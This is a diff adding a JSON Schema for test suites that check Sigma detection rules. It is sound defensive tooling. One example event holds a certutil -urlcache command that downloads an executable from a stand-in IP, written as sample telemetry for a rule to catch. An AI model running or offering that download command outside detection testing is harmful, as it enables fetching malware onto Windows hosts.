@@ -1,0 +1,131 @@
+{
+  "$schema": "https://json-schema.org/draft/2020-12/schema",
+  "$id": "https://principlebreach.com/schema/ordeal/suite.schema.json",
+  "title": "Ordeal test suite",
+  "description": "A sidecar test suite for a Sigma detection rule, named <rule>.test.yml and stored next to the rule it tests. Ordeal rejects unknown keys, so this schema is closed at every level.",
+  "type": "object",
+  "required": ["rule", "cases"],
+  "additionalProperties": false,
+  "properties": {
+    "rule": {
+      "type": "string",
+      "minLength": 1,
+      "description": "Path to the Sigma rule under test, relative to this suite file.",
+      "examples": ["rule.yml", "../rules/certutil_download.yml"]
+    },
+    "config": {
+      "type": "array",
+      "minItems": 1,
+      "uniqueItems": true,
+      "description": "Optional sigma-go field-mapping config paths, relative to this suite file, applied in order.",
+      "items": {
+        "type": "string",
+        "minLength": 1
+      },
+      "examples": [["sysmon.yml"]]
+    },
+    "mutate": {
+      "type": "boolean",
+      "default": true,
+      "description": "Set false to opt this suite out of adversarial mutation. Defaults to true."
+    },
+    "cases": {
+      "type": "array",
+      "minItems": 1,
+      "description": "The expectations this suite asserts. At least one is required.",
+      "items": { "$ref": "#/$defs/case" }
+    }
+  },
+  "$defs": {
+    "case": {
+      "type": "object",
+      "title": "Test case",
+      "description": "One expectation: an event, or a dataset of events, plus the verdict it must produce.",
+      "required": ["name"],
+      "additionalProperties": false,
+      "properties": {
+        "name": {
+          "type": "string",
+          "minLength": 1,
+          "description": "Unique name for this case within the suite. Name the behavior, not the rule.",
+          "examples": ["certutil urlcache download fires"]
+        },
+        "event": {
+          "$ref": "#/$defs/event"
+        },
+        "dataset": {
+          "type": "string",
+          "minLength": 1,
+          "pattern": "\\.(json|jsonl|ndjson)$",
+          "description": "Path to a telemetry file, relative to this suite file. Every event in the file must produce the expected verdict. Accepts .json, .jsonl, and .ndjson.",
+          "examples": ["telemetry/certutil.jsonl"]
+        },
+        "match": {
+          "type": "boolean",
+          "default": true,
+          "description": "The expected verdict. Defaults to true."
+        },
+        "selections": {
+          "type": "array",
+          "minItems": 1,
+          "uniqueItems": true,
+          "description": "Named selections from the rule's detection block that must have fired. Valid only on an inline case with match true.",
+          "items": {
+            "type": "string",
+            "minLength": 1
+          },
+          "examples": [["selection_img", "selection_flags"]]
+        }
+      },
+      "oneOf": [
+        {
+          "title": "Inline event",
+          "required": ["event"]
+        },
+        {
+          "title": "Dataset file",
+          "required": ["dataset"]
+        }
+      ],
+      "allOf": [
+        {
+          "$comment": "selections cannot be asserted when the rule is expected not to fire.",
+          "if": {
+            "properties": { "match": { "const": false } },
+            "required": ["match"]
+          },
+          "then": {
+            "not": { "required": ["selections"] }
+          }
+        },
+        {
+          "$comment": "selections cannot be asserted on a dataset case.",
+          "if": {
+            "required": ["dataset"]
+          },
+          "then": {
+            "not": { "required": ["selections"] }
+          }
+        }
+      ]
+    },
+    "event": {
+      "type": "object",
+      "title": "Event",
+      "description": "A flat event keyed by Sigma taxonomy field names, as the rule expects them after any configs are applied.",
+      "minProperties": 1,
+      "propertyNames": {
+        "minLength": 1
+      },
+      "additionalProperties": {
+        "type": ["string", "number", "boolean", "null"]
+      },
+      "examples": [
+        {
+          "Image": "C:\\Windows\\System32\\certutil.exe",
+          "CommandLine": "certutil.exe -urlcache -split -f http://198.51.100.10/a.exe a.exe"
+        }
+      ]
+    }
+  }
+}
